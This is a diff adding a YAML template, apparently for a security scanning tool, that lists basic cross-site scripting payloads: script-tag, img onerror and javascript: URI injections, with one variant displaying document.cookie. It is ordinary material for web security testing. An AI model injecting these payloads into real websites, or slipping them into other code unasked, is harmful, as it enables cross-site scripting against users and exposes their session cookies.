@@ -1,0 +1,19 @@
+templates:
+  - id: "XSS-BASIC"
+    type: "xss"
+    description: "Basic XSS injection patterns"
+    templates:
+      - "<script>alert('{{ .payload }}')</script>"
+      - "<img src=x onerror=alert('{{ .payload }}')>"
+      - "javascript:alert('{{ .payload }}')"
+    variables:
+      payload:
+        - "test"
+        - "document.cookie"
+        - "XSS"
+    tags:
+      - "xss"
+      - "basic"
+    metadata:
+      severity: "medium"
+      technique: "basic"
